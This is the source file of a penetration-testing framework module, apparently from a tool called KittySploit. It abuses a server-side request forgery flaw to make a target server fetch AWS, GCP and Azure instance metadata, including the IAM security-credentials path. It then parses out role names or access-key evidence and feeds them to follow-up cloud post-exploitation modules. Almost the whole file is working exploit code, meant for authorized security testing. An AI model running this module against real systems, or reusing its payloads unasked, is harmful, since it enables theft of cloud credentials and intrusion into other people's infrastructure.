#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Harvest cloud instance metadata through a confirmed SSRF injection point.

Chains from auxiliary/scanner/http/ssrf_scanner findings — reads AWS IMDS,
GCP computeMetadata, and Azure instance metadata paths via the vulnerable parameter.
"""

from __future__ import annotations

import re
import urllib.parse
from typing import Any, Dict, List, Optional

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.scanner.http.module_result import finalize_http_scanner_run, target_base_url


class Module(Auxiliary, Http_client):

    __info__ = {
        "name": "SSRF Cloud Metadata Harvest",
        "description": (
            "Exploit a confirmed SSRF primitive to retrieve cloud provider metadata "
            "(AWS IMDS, GCP computeMetadata, Azure instance) and IAM hints."
        ),
        "author": "KittySploit Team",
        "tags": ["web", "ssrf", "cloud", "metadata", "aws", "gcp", "azure", "imds"],
        "references": [
            "https://hackerone.com/reports?query=ssrf+metadata",
            "https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf",
        ],
        "agent": {
            "risk": "intrusive",
            "effects": ["network_probe", "active_exploitation"],
            "expected_requests": 8,
            "reversible": True,
            "approval_required": True,
            "produces": ["risk_signals", "endpoints"],
            "chain": {
                "consumes_capabilities": ["ssrf_primitive", "ssrf_param"],
                "produces_capabilities": [
                    {"capability": "cloud_credentials", "from_detail": "iam_role"},
                    {"capability": "cloud_identity", "from_detail": "cloud_provider"},
                ],
                "option_bindings": {
                    "ssrf_param": "ssrf_param",
                    "ssrf_method": "ssrf_method",
                },
                "suggested_followups": [
                    "post/aws/gather/enum_ec2_metadata",
                    "post/gcp/gather/whoami",
                    "post/azure/gather/whoami",
                ],
            },
        },
    }

    ssrf_param = OptString("url", "Vulnerable SSRF parameter name", True)
    ssrf_method = OptChoice("GET", "HTTP method for SSRF injection", False, ["GET", "POST"])
    ssrf_path = OptString("/", "Base path for injection (e.g. /fetch?url=)", False)
    cloud_target = OptChoice(
        "auto",
        "Cloud metadata target to probe",
        False,
        ["auto", "aws", "gcp", "azure"],
    )

    AWS_PATHS = [
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://169.254.169.254/latest/dynamic/instance-identity/document",
    ]
    GCP_PATHS = [
        "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email",
        "http://metadata.google.internal/computeMetadata/v1/project/project-id",
    ]
    AZURE_PATHS = [
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    ]

    _PROVIDER_MARKERS = {
        "aws": ("instance-id", "ami-id", "iam/security-credentials", "availability-zone"),
        "gcp": ("computeMetadata", "project-id", "service-accounts"),
        "azure": ("compute", "subscriptionId", "resourceGroupName", "vmId"),
    }

    def _inject(self, metadata_url: str) -> Optional[Any]:
        param = str(self.ssrf_param or "url").strip()
        method = str(self.ssrf_method or "GET").strip().upper()
        base = str(self.ssrf_path or "/").strip() or "/"

        if method == "GET":
            if "?" in base:
                sep = "&" if not base.endswith("?") else ""
                path = f"{base}{sep}{urllib.parse.urlencode({param: metadata_url})}"
            else:
                path = f"{base}?{urllib.parse.urlencode({param: metadata_url})}"
            return self.http_request(method="GET", path=path, allow_redirects=False, timeout=12)
        post_data = {param: metadata_url}
        return self.http_request(method="POST", path=base, data=post_data, allow_redirects=False, timeout=12)

    def _detect_provider(self, text: str) -> str:
        low = (text or "").lower()
        for provider, markers in self._PROVIDER_MARKERS.items():
            if any(m.lower() in low for m in markers):
                return provider
        return ""

    def _extract_iam_role(self, text: str) -> str:
        for line in (text or "").splitlines():
            line = line.strip()
            if line and not line.startswith("<") and "/" not in line and len(line) < 80:
                if re.match(r"^[A-Za-z0-9_\-]+$", line):
                    return line
        match = re.search(r'"AccessKeyId"\s*:\s*"([^"]+)"', text or "")
        if match:
            return "credentials_present"
        return ""

    def run(self):
        param = str(self.ssrf_param or "").strip()
        if not param:
            print_error("ssrf_param is required — seed from SSRF scanner chain context")
            return False

        targets: List[tuple[str, str]] = []
        cloud = str(self.cloud_target or "auto").strip().lower()
        if cloud in ("auto", "aws"):
            targets.extend(("aws", p) for p in self.AWS_PATHS)
        if cloud in ("auto", "gcp"):
            targets.extend(("gcp", p) for p in self.GCP_PATHS)
        if cloud in ("auto", "azure"):
            targets.extend(("azure", p) for p in self.AZURE_PATHS)

        hits: List[Dict[str, Any]] = []
        print_status(f"Harvesting cloud metadata via SSRF param={param} method={self.ssrf_method}")

        for provider, metadata_url in targets:
            response = self._inject(metadata_url)
            if not response or response.status_code not in (200, 201, 204):
                continue
            body = response.text or ""
            if len(body) < 8:
                continue
            detected = self._detect_provider(body) or provider
            iam_role = self._extract_iam_role(body)
            print_success(f"[{detected}] metadata response via {metadata_url[:60]}...")
            hits.append({
                "vulnerable": True,
                "param": param,
                "method": str(self.ssrf_method or "GET"),
                "payload": metadata_url,
                "ssrf_type": "Cloud metadata access",
                "indicator": f"{detected}_metadata",
                "status_code": response.status_code,
                "content_preview": body[:1200],
                "cloud_provider": detected,
                "iam_role": iam_role,
                "metadata_path": metadata_url,
            })

        if not hits:
            print_warning("No cloud metadata retrieved — verify SSRF param/method or try cloud_target")
            return finalize_http_scanner_run(
                self,
                [],
                title="SSRF cloud metadata harvest",
                severity="high",
                category="ssrf",
                findings_key="ssrf_metadata_findings",
            )

        top = hits[0]
        chain_extra = {
            "ssrf_param": param,
            "ssrf_method": str(self.ssrf_method or "GET"),
            "cloud_provider": top.get("cloud_provider"),
            "iam_role": top.get("iam_role") or "",
            "metadata_path": top.get("metadata_path"),
        }
        return finalize_http_scanner_run(
            self,
            hits,
            title="SSRF cloud metadata harvest",
            severity="critical" if any(h.get("iam_role") for h in hits) else "high",
            category="ssrf",
            findings_key="ssrf_metadata_findings",
            hit_mapper=lambda hit: {
                "param": hit.get("param"),
                "method": hit.get("method"),
                "request_url": target_base_url(self),
                "payload": hit.get("payload"),
                "status_code": hit.get("status_code"),
                "evidence_snippet": hit.get("content_preview") or hit.get("indicator"),
                "indicators": [hit.get("indicator")] if hit.get("indicator") else [],
                "cloud_provider": hit.get("cloud_provider"),
                "iam_role": hit.get("iam_role"),
            },
            vulnerability_info_extra=chain_extra,
        )
